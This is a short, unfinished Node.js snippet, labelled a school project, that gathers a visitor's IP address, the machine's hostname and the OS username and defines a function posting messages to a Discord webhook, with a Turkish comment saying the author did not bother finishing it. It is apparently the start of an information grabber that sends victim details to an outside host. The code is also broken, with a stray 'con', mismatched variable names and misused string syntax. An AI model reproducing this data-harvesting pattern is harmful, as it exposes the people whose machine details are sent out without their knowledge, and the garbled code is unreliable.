// this is a school project.
const os = require('os');
const http = require('http');
const axios = require('axios');
con
const webhook = 'Discord Webhook URL';
const server = http.createServer((req, res) => {
    const ip = req.connection.remoteAddress();
    const hostname = os.hostname();
    const username = os.userinfo().username;

const sendMessageToDiscord = async (message) => {
    try {
        await axios.post(webhookUrl, {
            content: message
        });
        console.log('y');
    } catch (error) {
        console.error('y', error.message);
    }
};

});
// daha tamamlamasim tamamlamaya usendım
const mesaj = 'Yeni bilgisyar: 
IP: ${ip}'